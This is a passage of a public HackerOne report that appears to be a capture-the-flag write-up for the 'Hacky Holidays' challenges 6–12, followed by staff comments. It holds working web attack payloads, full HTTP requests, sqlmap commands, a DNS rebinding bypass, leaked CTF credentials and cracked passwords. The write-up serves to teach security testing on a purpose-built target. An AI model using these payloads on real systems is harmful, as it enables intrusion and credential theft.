file)\n{F1140084}\n\n### Supporting Material/References:\n\n### Key takeaways\nSometimes the grep is better than checking just the size, because the error could be the same length as what you are trying to filter out.\n\n## 6. Source code exposure. Weak filter bypass that leads to PHP LFI.\nAfter opening an app, we saw a template parameter setting `entries.html`. The endpoint Bruteforce showed us that the app is written in php, and the file that is being executed as default is `index.php`.\nThat led us to an idea to include `index.php` in `template` parameter, which gave us its source-code.\n\nAfter studying a source-code, I discovered that there are `admin.php` and `secretadmin.php` files that are our targets. Also, there are checks implemented, but truth to say they are weak, e.g. `str_replace` function that replaces only the first occurrence with the empty string, so that `admadmin.php.php` will become `admin.php`\n\nFollowing that way, I constructed a payload - `secretadminsecretadadmin.phpmin.php.php` that resulted into `secretadmin.php` after all replacements. That way we included a `secretadmin.php` source code and got our flag\n\n### Steps to reproduce\n  * Navigate to https://hackyholidays.h1ctf.com/my-diary\n  * Notice template parameter and change it to index.php e.g. https://hackyholidays.h1ctf.com/my-diary/?template=index.php (You should get code of index.php)\n{F1140087}\n  * Read the code, understand the logic\n  * Construct a payload that bypasses protections.\n  * Send a request with the payload - https://hackyholidays.h1ctf.com/my-diary/?template=secretadminsecretadadmin.phpmin.php.php\n{F1140088}\n  * Get the flag\n\n### Supporting Material/References:\n\n### Key takeaways\nNever use one-time replacing function, where you need recursion.\n\n## 7. Directory listing and SSTI\nHate-mail-generator is some campaign creation mini-app that has an example, that was created for us. The example contains template braces like `{{name}}`, which is replaced by `Bob` in preview mode. Also, an example has `{{template:cbdj3_grinch_header.html}}`, which is being replaced by HTML code found in this template.\n\nBruteforcing directories gave us a `/templates` directory. A directory listing on this directory gave us a new template `38dhs_admins_only_header.html`, but unfortunately the template is not accessible directly.\n\nBut thanks to Mr Grinch, because he left us an ability to create and preview our own campaigns. After intercepting the request, we saw that `preview_data` parameter is being supplied with `preview_markup`, where preview_data contained a JSON with the keys and values that are reflected in the campaign message.\n\nThis all led us to injection of a template `{{template:38dhs_admins_only_header.html}}` as the value of `name` key in `preview_data`, also where `preview_markup` was including `{{name}}`. That way we tricked an application to first fetch the template code and secondly reflect it in our variable.\n\n### Steps to reproduce\n  * Navigate to https://hackyholidays.h1ctf.com/hate-mail-generator\n  * Start a brute force of directories (you should find templates directory.\n\n```\n~/go/bin/gobuster https://hackyholidays.h1ctf.com/hate-mail-generator/ -w ~/Tools/lists/dirbuster/directory-list-2.3-medium.txt -t 40\n```\n\n{F1140092}\n  * Click on `Guess What` (https://hackyholidays.h1ctf.com/hate-mail-generator/91d45040151b681549d82d8065d43030)     \n{F1140090}\n  * Look at the markup, copy this part `{{template:cbdj3_grinch_header.html}}`\n{F1140091}\n  * Go back. And click on `Create New` (https://hackyholidays.h1ctf.com/hate-mail-generator/new)\n  * Set up a Burp Suite Proxy.\n  * Enter a name, subject and add our copied markup. Click on `preview`\n  * Intercept the request and send it to repeater. Notice preview_data parameter which decodes to `{\"name\":\"Alice\",\"email\":\"alice@test.com\"}`\n  * Go to https://hackyholidays.h1ctf.com/hate-mail-generator/templates/ and copy 38dhs_admins_only_header.html\n  * In Repeater change preview_data parameter content to `{\"name\":\"{{template:38dhs_admins_only_header.html}}\",\"email\":\"alice@test.com\"}`\n  * Send a new request\n\n```\nPOST /hate-mail-generator/new/preview HTTP/1.1\nHost: hackyholidays.h1ctf.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 210\nOrigin: https://hackyholidays.h1ctf.com\nConnection: close\nReferer: https://hackyholidays.h1ctf.com/hate-mail-generator/new\nUpgrade-Insecure-Requests: 1\n\npreview_markup=Hello+%7B%7Bname%7D%7D+....+%7B%7Btemplate%3Acbdj3_grinch_header.html%7D%7D\u0026preview_data=%7B%22name%22%3A%22{{template:38dhs_admins_only_header.html}}%22%2C%22email%22%3A%22alice%40test.com%22%7D\n```\n\n{F1140093}\n  *  Get your flag\n\n### Supporting Material/References:\n\n### Key takeaways\nAlways try different injection points, like preview_markup and preview_data, not just one\n\n## 8. Source code leakage with secrets through open git repository. Weak password usage.\nThe next task was solved with some luck, as I had to ask help from Google, by googling `grinch networks forum` and clicking on a 5th link, which redirected me to the github page of a creator of this CTF. The strange thing was, that the `forum` repository was open, but wasn't listed in repository column, only that it was the last repository to which adamtlangley created a commit.\n\nI cloned the repository and used `git` tool to look through the history of commits. One commit was suspicious - `small fix`. After scrolling a bit, I found credentials `forum` as username and `6HgeAZ0qC9T6CQIqJpD` as password.\n\nThe credentials were used on `/phpmyadmin` endpoint, which then led to getting md5 hash of grinch password. Bruteforcing the password locally with the help of hashcat gave nothing, but I decided to check the hash using online service, that has much bigger hash:password collections than I do. And indeed, using crackstation.net, cmd5.ru or another service gave a password - `BahHumbug`.\n\nLogging into grinch account gives us powers to look into secret messages and grab the flag.\n\n### Steps to reproduce\n  * Navigate to https://hackyholidays.h1ctf.com/forum\n  * Brute-force directories. It should find an interesting `phpmyadmin` directory\n\n```\n~/go/bin/gobuster dir -u https://hackyholidays.h1ctf.com/forum/ -w ~/Tools/lists/dirbuster/directory-list-2.3-medium.txt -t 40\n```\n\n  * Look for `grinch networks forum` in Google\n{F1140101}\n  * Navigate to the fifth result - https://github.com/adamtlangley\n  * If we study the first page, we'll notice `Grinch-Networks/forum` repository\n  * Clone the repository, check history of commits and look into an interesting commit\n\n```\ngit clone https://github.com/Grinch-Networks/forum\ncd forum\ngit log\ngit log -p -2\n```\n\n{F1140102}\n  * After scrolling down, you should find a line with credentials `self::$write = new DbConnect( true,  'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );`\n  * Use credentials to authenticate yourself on `phpmyadmin` endpoint\n  * Click on `forum`, then on `user` . (https://hackyholidays.h1ctf.com/forum/phpmyadmin/?db=forum\u0026table=user)  \n\n{F1140103}\n  * Copy the hash of Mr Grinch. `35D652126CA1706B59DB02C93E0C9FBF`\n  * Use online service like crackstation.net to find a clear-text password. The password is - `BahHumbug`\n  * Now login to `grinch` account using password `BahHumbug` using the first login page - https://hackyholidays.h1ctf.com/forum/login\n{F1140104}\n  * Navigate to https://hackyholidays.h1ctf.com/forum/3/2\n{F1140105}\n  * Get the flag\n\n### Supporting Material/References:\n\n### Key takeaways\nClose repositories and delete history! If you attack, then look for open repos and look at commit history.\n\n## 9. Second-order SQL Injection\nEvil-quiz was pretty easy. In order to prove that we have a SQL Injection I had to create two different accounts, the first name was `admin\"` and the second name was `admin'`. After submitting a quiz we were redirected to the score page, where in the first case we had at least one user with the same name, and in the second case, we always had 0 users with the same name. Even after I create another user with a name `admin'` - the number didn't change, it was still 0.\n\nThat meant that the application was querying a database for usernames like the one we supplied and counting them. The query failed, and the resulting number was 0.\n\nIn order to exploit this second-order SQL Injection, we had to make sqlmap differentiate between what's a true answer and what's not because the size of the response doesn't change. `--regexp` argument\nhelped us to match all values that didn't match `There is 0 other player(s) with the same name as you!`, but matched the same line with a different number like 1,5,242, etc.\n\nThen it was just a matter of time when we get the credentials. After we got them, we just logged in and got a flag.\n\n### Steps to reproduce\n  * Navigate to https://hackyholidays.h1ctf.com/evil-quiz\n  * Set name to `admin\"`, finish the quiz and note the answer on a score page.\n\n```\nThere is 1 other player(s) with the same name as you!\n```\n\n{F1140108}\n  * Navigate to https://hackyholidays.h1ctf.com/evil-quiz again\n  * Set name to `admin'`, finish the quiz and note the answer on a score page.\n\n```\nThere is 0 other player(s) with the same name as you!\n```\n\n{F1140109}\n{F1140110}\n  * As it's definitely a second order sql injection we would like to check it and dump DB quickly. For that intercept 2 requests (POST to /evil-quiz with name parameter and GET to /evil-quiz/score)  and save them to files first.req, second.req \n\nfirst.req\n\n```\nPOST /evil-quiz HTTP/1.1\nHost: hackyholidays.h1ctf.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 56\nOrigin: https://hackyholidays.h1ctf.com\nConnection: close\nCookie: session=b4d9476eed4279882950934fdad25595;\nReferer: https://hackyholidays.h1ctf.com/evil-quiz\nUpgrade-Insecure-Requests: 1\n\nname=admin*\n\n```\n\nsecond.req\n\n```\nGET /evil-quiz/score HTTP/1.1\nHost: hackyholidays.h1ctf.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nOrigin: https://hackyholidays.h1ctf.com\nConnection: close\nReferer: https://hackyholidays.h1ctf.com/evil-quiz/start\nCookie: session=b4d9476eed4279882950934fdad25595;\nUpgrade-Insecure-Requests: 1\n\n```\n\n  * Now send use this sqlmap command. Answers to questions - Y,Y,N,N\n\n```\nsudo sqlmap -r first.req --second-req second.req --regexp='There is [0-9]*[1-9][0-9]* other player\\(s\\)' \n```\n\n  * Now dump a table with admin and password\n\n```\nsudo sqlmap -r first.req --second-req second.req --regexp='There is [0-9]*[1-9][0-9]* other player\\(s\\)' -D quiz -T admin --dbms=mysql --dump\n```\n\n```\n| id | username | password          |\n+----+----------+-------------------+\n| 1  | admin    | S3creT_p4ssw0rd-$ |\n+----+----------+-------------------+\n```\n\n{F1140112}\n  * Login to https://hackyholidays.h1ctf.com/evil-quiz/admin using found credentials\n  * Get the flag\n\n### Supporting Material/References:\n\n### Key takeaways\nLook for strange behaviour and check it twice with different accounts.\n\n## 10. Source code exposure through developer comments. Insecure usage of functions that leads to overflow and thus arbitrary user creation with administrator privilege\nThe signup-manager was different from other apps, in a way that we had to study source-code, that we got because of the developer comment in HTML file.\n\nIt was clear that all we had to do is to overflow some part of the string in order to add at least one character to it and set the last character of `lastname` as `Y`. That way, we would become an admin user.\n\nAll parameters were interesting, but the password and token are md5 hashes, and we cannot change their character length. username, lastname and firstname are being checked and only first 15 characters are taken from them. But there is an `age` parameter that isn't being stripped into 15 characters, but rather it's checked whether it is numeric, whether it's more than 3 characters and is cast into an integer value.\n\nThe functions that are being used are `is_numeric` and `intval`. After reading their documentation its clear that we can supply characters in different notation, e.g. in scientific one, so that our value would bypass `is_numeric` and `strlen` check, but would casted in much bigger integer by `intval`.\n\nThat's why we supplied 1e3, which is 1*10^3 = 1000 as the value of age argument. And that's how we got a flag and got to know about a new endpoint - `/r3c0n_server_4fdk59`\n\n### Steps to reproduce\n  * Navigate to https://hackyholidays.h1ctf.com/signup-manager/\n  * Look at HTML source code. Ctrl+U . Find a comment with README.md\n{F1140113}\n  * Download a readme file https://hackyholidays.h1ctf.com/signup-manager/README.md\n  * Read the file. Download and unzip https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip\n\n```\nwget https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip\nunzip signupmanager.zip\n```\n\n  * You'll have to analyze the source code.     \n{F1140114}\n  * The most interesting and right part of the source code is:\n\n```\nif (!is_numeric($_POST[\"age\"])) {\n       $errors[] = 'Age entered is invalid';\n}\nif (strlen($_POST[\"age\"]) \u003e 3) {\n       $errors[] = 'Age entered is too long';\n}\n$age = intval($_POST[\"age\"]);\n\n```\n\n  * After reading the docs, we notice that there are insufficient checks implemented:\nhttps://www.php.net/manual/en/function.is-numeric.php\nhttps://www.php.net/manual/en/function.intval.php\n  * We are able to send a number in a scientific notation like `1e3` (means 1*10^3), that helps us to bypass the check on more than 3 characters and set admin privileges for ourselves.\n  * Send the following POST request to the target\n\n```\nPOST /signup-manager/ HTTP/1.1\nHost: hackyholidays.h1ctf.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 137\nOrigin: https://hackyholidays.h1ctf.com\nConnection: close\nReferer: https://hackyholidays.h1ctf.com/signup-manager/\nUpgrade-Insecure-Requests: 1\n\naction=signup\u0026username=username_urqxn\u0026password=pass\u0026age=1e3\u0026firstname=YYYYYYYYYYYYYYYYYYYYYYYYYYYY\u0026lastname=YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY\n```\n\n{F1140115}\n  * The application will set a `token`. If it's not set automatically, copy it and set it manually and send another request\n\n```\nGET /signup-manager/ HTTP/1.1\nHost: hackyholidays.h1ctf.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nCookie: token=9e9354b6c3a1f5e7686813daf14ac4b5;\nOrigin: https://hackyholidays.h1ctf.com\nConnection: close\nReferer: https://hackyholidays.h1ctf.com/signup-manager/\nUpgrade-Insecure-Requests: 1\n\n```\n\n{F1140116}\n  * Get the flag and discover a new endpoint - `/r3c0n_server_4fdk59`\n\n### Key takeaways\nSearch for developer comments. Read the documentation of functions.\n\n## 11 Double SQL Injection and Path traversal\nRecon server was a bit hard due to it's a rather new technique for me. Firstly I found a SQL Injection in a hash parameter of `/album` endpoint, but it didn't give much at first. Only after I decided to check other parts of an app, I found that there is another endpoint - `/picture` that fetches an image from `/uploads` directory. The value of a parameter used in picture endpoint is b64 encoded and contains a path and an auth md5 token, which is being checked and just changing the path value gives nothing.\n\nThe default page said that an API is being developed, and after finding an `/api` endpoint and trying to brute-force further, it became evident that only an app can access them.\n\nIt's not possible to forge an auth token ourselves, and it's not possible to get at least an image directly, that's why I thought on how we could make the app forge the path for us. That's when I decided to fuzz the sql injection again, and as a result, I discovered a second sql injection, an internal one,\nthat changed the path and if done right signed with auth token. In that way, we could perform a path traversal attack.\n\nThanks to a path traversal and auth forging, we were able to brute-force an api endpoint and find a few of them, where one was really interesting - `user`, brute-forcing parameters gave us `username` and `password`. After that, I fuzzed them and found that they act as a `LIKE` operator and by submitting `%` we match any character, any substring of any length, so that we can brute force and get a username and password.\n\nThe username and password should be used on `/attack-box` endpoint.\n\n### Steps to reproduce\n  * Navigate to https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/\n  * Start bruteforcing directories (you'll find api endpoint)\n\n```\n~/go/bin/gobuster dir -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/ -w ~/Tools/lists/dirbuster/directory-list-2.3-medium.txt -t 40\n```\n\n  * Find SQL Injection in `hash` parameter https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k\n  * Start the sqlmap \n\n```\nsudo sqlmap -u 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k'\n```\n\n  * Notice that this endpoint accesses \n  * After enumerating, fuzzing and assuming that this was a subquery it was possible to inject the second injection. \n  * Download a script that fuzzes API endpoints and parameters - {F1140133}\n  * launch API endpoint brute-force \n\n```\npython3 double_sql.py -w ~/Tools/lists/SecLists/Discovery/Web-Content/common.txt --postfix ?s=1 -s 404\n```\n    \n{F1140120}\n  * launch parameter brute-force\n\n```\npython3 double_sql.py -w ~/Tools/lists/SecLists/Discovery/Web-Content/common.txt --prefix user? --postfix =1 -s 404,400\n```\n    \n{F1140121}   \n  * download {F1140136} and launch username enumeration (launch for each character) result - `grinchadmin` \n\n```\npython3 double_sql.py -w characters.txt -s 400 --prefix user?username=g --postfix % -s 204\npython3 double_sql.py -w characters.txt -s 400 --prefix user?username=grinch --postfix % -s 204\n```\n\n  * launch password enumeration (launch for each character) result - `s4nt4sucks`\n\n```\npython3 double_sql.py -w characters.txt -s 400 --prefix 'user?username=grinchadmin\u0026password=' --postfix % -s 204\npython3 double_sql.py -w characters.txt -s 400 --prefix 'user?username=grinchadmin\u0026password=s4nt' --postfix % -s 204\n```\n  \n{F1140122}\n  * Navigate to hackyholidays.h1ctf.com/attack-box/ and use credentials `grinchadmin` and `s4nt4sucks` to sign in   \n{F1140123}\n  * Take the flag\n### Supporting Material/References:\n\n### Key takeaways\nAlways fuzz\n\n## 12. Insecure cryptographic salt usage. Predictive algorithm used. DNS Rebinding attack\nAttack box, the last app, that we had to crack. After logging in with the credentials we found before, we explored the functionality, and I saw that Mr Grinch was doing a DDoS attack on a couple of IPs. Our mission was to take him down, so what we needed is to change the IP to his.\n\nThe `launch` endpoint had a `payload` parameter with a base64 encoded value containing target argument (IP) and a hash, a sign that checked whether the payload was forged or not.\n\nFirstly we had to forge our payloads, and I decided to check different hash algorithms like `md5(salt + pass)`, `md5(pass + salt)` or even `md5(md5(pass)+salt)`. The script found that the salt was `mrgrinch463`. From now on, we could supply any IP to the attack box.\n\nI couldn't find Mr Grinch IP addresses, but thought that we could take out attack boxes by DDoSing `127.0.0.1`, but there is a check that stops an attack on the localhost. Sending different payloads, like an integer representation of an IP, or cname won't work, because the check does a `dig` lookup for an ip, and checks whether it is an internal one.\n\nIn order to bypass that check, I remembered about a DNS Rebinding attack, where the host changed the IP address after getting the first resolve (or by any other algorithm). There are a couple of services that help us to do this type of attack, but I stopped on `https://lock.cmpxchg8b.com/rebinder.html`. For the attack, I developed a script that would create links for us.\n\nUsing the hosts that I hard-coded in a script and their links it's possible to DDoS Grinch Networks.\nWe'll be redirected to the final page and get the last flag.\n\n### Steps to reproduce\n  * Navigate to https://hackyholidays.h1ctf.com/attack-box\n  * Log in with username - `grinchadmin` and password - `s4nt4sucks`\n  * Intercept requests with Burp Suite. Click on `Attack` button and notice requests that are being done\n  * Notice a request to \n\n```\nhttps://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==\n```\n\n  * payload parameter decodes into \n\n```\n{\"target\":\"203.0.113.33\",\"hash\":\"5f2940d65ca4140cc18d0878bc398955\"}\n```\n\n{F1140124}\n  * Download the script {F1140135}\n  * Lauch the script with target and hash values as first and second arguments for the script and a wordlist as the third.\n\n```\npython3 hash_target.py 203.0.113.33 5f2940d65ca4140cc18d0878bc398955 ~/Tools/lists/SecLists/Passwords/Leaked-Databases/rockyou.txt\n```\n\n{F1140125}\n  * To verify that  the salt is the same across different IPs, execute the command again with other values.\n\n```\necho eyJ0YXJnZXQiOiIyMDMuMC4xMTMuNTMiLCJoYXNoIjoiMjgxNGY5YzczMTFhODJmMWI4MjI1ODUwMzlmNjI2MDcifQ== | base64 -d\n```\n\n  * The salt is `mrgrinch463` and an algorithm for hash - md5(salt + data_to_hash)\n  * Localhost check bypass using DNS rebinding (You should try a couple times, as it may not work at first)\n  * Download ssrf.py {F1140134}\n  * Go to https://lock.cmpxchg8b.com/rebinder.html\n  * Set A to 8.8.8.810 and B to 127.0.0.1 . Copy the result (it should be `0808080a.7f000001.rbndr.us`)\n  * Execute ssrf.py script to get an attack links (I've hardcoded hosts you were looking into)\n\n```\npython3 ssrf.py mrgrinch463 \n```\n\n{F1140126}\n  * Navigate to the links that you got (e.g. https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiAiMDgwODA4MGEuN2YwMDAwMDEucmJuZHIudXMiLCAiaGFzaCI6ICIyNTE5YTA1YzA3M2YxMmYxNzg3MTdkYTNlYjlhZDczMyJ9)    \n{F1140131}\n  * Once the attack works, you should be able to take down Grinch Networks - https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709\n\n{F1140127}\n\n### Key takeaways\nNever give up, as I though to give up thrice on this challenge.","automated_response":false,"created_at":"2020-12-31T19:59:38.413Z","updated_at":"2020-12-31T20:06:12.669Z","actor":{"username":"yso","cleared":false,"url":"/yso","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/VP4vgtKMVsQkH3usE51Nnb8B/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10245789,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@anyone If possible, could you please make my first Huge report smaller by just leaving files only, without content (second comment), and leave the last one. I made formatted it better, because the first one slipped :(","automated_response":false,"created_at":"2020-12-31T20:07:20.178Z","updated_at":"2020-12-31T20:08:15.282Z","actor":{"username":"yso","cleared":false,"url":"/yso","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/VP4vgtKMVsQkH3usE51Nnb8B/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10299550,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for participating in the 12 Days of Hacky Holidays and helping us stop the grinch! ","automated_response":false,"created_at":"2021-01-07T21:31:04.625Z","updated_at":"2021-01-07T21:31:04.625Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"yso","url":"/yso"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10334438,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Could you please disclose only the first and third comments?","automated_response":false,"created_at":"2021-01-11T22:56:04.269Z","updated_at":"2021-01-11T22:56:04.269Z","first_to_agree":true,"actor":{"username":"yso","cleared":false,"url":"/yso","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/VP4vgtKMVsQkH3usE51Nnb8B/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10334532,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry, it's either limited or all of it. ","automated_response":false,"created_at":"2021-01-11T23:23:04.027Z","updated_at":"2021-01-11T23:23:04.027Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10334554,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"oh, okay then, @nahamsec let's go for all in:)\n\nBy the way, is it possible to look up which place I got in this CTF? (I hope there is some functionality that could track this results). \nAnd also will HackerOne release statistics about HackyHolidays CTF? (how many users solved at least 1 flag, how many solved the whole ctf, how much time did it take to solve each challenge for the first person to solve that challenge, etc.)?","automated_response":false,"created_at":"2021-01-11T23:27:42.282Z","updated_at":"2021-01-11T23:27:42.282Z","actor":{"username":"yso","cleared":false,"url":"/yso","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/VP4vgtKMVsQkH3usE51Nnb8B/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10343341,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @yso - We currently don't have a point system to place people for each CTF. However, the (leaderboard)[https://hackerone.com/h1-cft/thanks]  is used as a place to show ranking for everyone participating in our CTFs. ","automated_response":false,"created_at":"2021-01-12T18:02:25.094Z","updated_at":"2021-01-12T18:02:25.094Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10343343,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-01-12T18:02:35.102Z","updated_at":"2021-01-12T18:02:35.102Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10343344,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-01-12T18:02:35.234Z","updated_at":"2021-01-12T18:02:35.234Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}